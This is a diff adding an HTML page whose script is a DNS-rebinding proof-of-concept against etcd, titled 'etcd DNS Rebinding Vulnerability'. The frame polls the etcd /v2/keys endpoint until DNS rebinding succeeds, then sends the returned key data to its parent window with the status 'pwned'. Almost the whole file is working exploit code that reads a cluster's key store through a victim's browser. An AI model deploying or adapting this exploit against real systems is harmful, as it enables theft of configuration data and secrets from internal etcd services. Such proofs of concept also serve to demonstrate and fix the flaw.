@@ -1,0 +1,67 @@
+<html>
+<head>
+<script>
+
+var timer;
+var frame;
+var xhr;
+var interval = 60000;
+
+function sendRpc()
+{
+    xhr = new XMLHttpRequest();
+    xhr.open("GET", "/v2/keys", false);
+
+    try {
+        xhr.send();
+    } catch(e) {
+        console.log("failed to send xhr");
+	console.log(e);
+    }
+
+    if (xhr.status == 404) {
+        console.log("frame", window.location.hostname, "has not updated dns yet, waiting", interval, "milliseconds");
+        return;
+    }
+
+    console.log("attack frame", window.location.hostname, "received xhr response", xhr.status);
+
+    if (xhr.status == 200) {
+        clearInterval(timer);
+        window.parent.postMessage({status: "pwned", response: xhr.responseText}, "*"); 
+    }
+}
+
+function begin()
+{
+    // Notify the parent that we're loaded.
+    window.parent.postMessage({status: "start"}, "*");
+}
+
+window.addEventListener("message", function (e) {
+    console.log("attack frame", window.location.hostname, "received message", e.data.cmd);
+
+    switch (e.data.cmd) {
+        case "interval":
+            interval = parseInt(e.data.param) * 1000;
+            break;
+        case "stop":
+            clearInterval(timer);
+            break;
+        case "start":
+            timer = setInterval(sendRpc, interval);
+            console.log("frame", window.location.hostname, "waiting", interval, "milliseconds for dns update");
+            break;
+    }
+});
+
+</script>
+</head>
+<body onload="begin()">
+<p>
+    <h3>etcd DNS Rebinding Vulnerability</h3>
+</p>
+<p>
+    This page is waiting for a dns update, and will then contact etcd.
+</p>
+</body>
